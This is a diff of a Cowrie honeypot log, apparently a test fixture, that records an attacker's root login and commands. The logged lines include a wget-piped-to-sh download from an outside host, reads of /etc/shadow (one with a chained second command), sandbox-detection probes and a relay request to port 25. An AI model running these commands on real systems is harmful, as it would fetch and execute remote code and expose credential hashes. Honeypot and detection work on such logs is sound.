@@ -1,7 +1,14 @@
-{"eventid":"cowrie.session.connect","src_ip":"203.0.113.7","session":"a1","timestamp":"2026-10-05T07:11:23.959011Z"}
-{"eventid":"cowrie.login.failed","src_ip":"203.0.113.7","session":"a1","username":"root","password":"123456","timestamp":"2026-10-05T07:11:37.065293Z"}
-{"eventid":"cowrie.login.success","src_ip":"203.0.113.7","session":"a1","username":"root","password":"apple","timestamp":"2026-10-05T07:11:53.466838Z"}
-{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","session":"a1","input":"cat /etc/shadow","timestamp":"2026-10-05T07:12:02.484294Z"}
-{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","session":"a1","input":"wget http://203.0.113.9/x.sh -O- | sh","timestamp":"2026-10-05T07:12:13.200027Z"}
-{"eventid":"cowrie.session.file_download","src_ip":"203.0.113.7","session":"a1","url":"http://203.0.113.9/x.sh","shasum":"25ddf2c883e0d1958ea971d279a7e4f0fd446724ee3db7db19dadabd4a62e484","timestamp":"2026-10-05T07:12:30.667343Z"}
-{"eventid":"cowrie.direct-tcpip.request","src_ip":"203.0.113.7","session":"a1","dst_ip":"198.51.100.4","dst_port":25,"timestamp":"2026-10-05T07:12:33.000000Z"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.session.connect"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.login.failed","username":"root","password":"123456"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.login.success","username":"root","password":"apple"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"cat /etc/shadow"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"wget http://203.0.113.9/x.sh -O- | sh"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.session.file_download","url":"http://203.0.113.9/x.sh","shasum":"25ddf2c883e0d1958ea971d279a7e4f0fd446724ee3db7db19dadabd4a62e484"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.direct-tcpip.request","dst_ip":"198.51.100.4","dst_port":25}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"dmesg | grep -i virtual"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"cat /proc/1/cgroup"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"ssh -V"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"sudo cat /etc/shadow"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"echo ok; cat /etc/shadow"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"uptime"}
+{"src_ip":"203.0.113.7","session":"a1","eventid":"cowrie.command.input","input":"echo hello"}
